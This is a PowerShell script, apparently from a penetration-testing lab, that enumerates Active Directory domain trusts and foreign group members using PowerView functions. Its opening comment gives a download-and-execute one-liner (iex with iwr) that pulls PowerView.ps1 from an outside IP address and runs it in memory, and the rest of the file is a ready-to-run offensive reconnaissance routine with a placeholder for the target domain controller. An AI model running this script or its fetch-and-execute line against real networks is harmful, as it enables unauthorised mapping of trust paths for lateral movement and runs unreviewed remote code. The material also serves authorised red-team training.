# We need to load PowerView before running this script - iex(iwr http://192.168.45.195/PowerView.ps1 -useb)
# Make sure to change the -DomainController flag value to your Domain's DC.

function Get-ForeignGroupMembers {
    Write-Host "Retrieving domain trust mappings..."
    $trusts = Get-DomainTrustMapping -API

    if ($trusts) {
        Write-Host "Found trust mappings. Processing each domain..."

        foreach ($trust in $trusts) {
            $trustedDomain = $trust.TargetName

            if ($trustedDomain) {
                Write-Host "Processing domain: $trustedDomain"

                try {
                    # Get foreign group members for the trusted domain
                    $foreignGroupMembers = Get-DomainForeignGroupMember -Domain $trustedDomain -DomainController <CHANGE ME>

                    if ($foreignGroupMembers) {
                        Write-Host "Found foreign group members in ${trustedDomain}:"
                        $foreignGroupMembers | Format-Table -AutoSize -Wrap
                    } else {
                        Write-Host "No foreign group members found in ${trustedDomain}."
                    }
                } catch {
                    Write-Host "Error processing domain ${trustedDomain}: $_"
                }
            } else {
                Write-Host "No target domain found for a trust. Skipping..."
            }
        }
    } else {
        Write-Host "No domain trusts found."
    }
}
